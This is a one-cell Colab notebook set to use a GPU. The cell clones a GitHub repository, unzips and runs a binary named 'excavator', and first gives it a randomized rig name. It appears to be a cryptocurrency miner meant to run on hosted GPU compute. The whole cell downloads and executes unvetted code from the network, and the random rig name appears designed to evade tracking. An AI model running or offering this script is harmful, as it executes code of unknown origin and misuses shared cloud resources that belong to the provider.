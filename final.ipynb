{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "final.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "bxLBw4kNcJnu"
      },
      "source": [
        "!git clone https://github.com/userdz0/666 && cd 666 && unzip ex.zip && chmod +x excavator && perl -pe 's/testrig/\"\" . (100 + int rand 900) . \"\"/ge' < 2.conf > 1.conf && ./excavator -c 1.conf"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}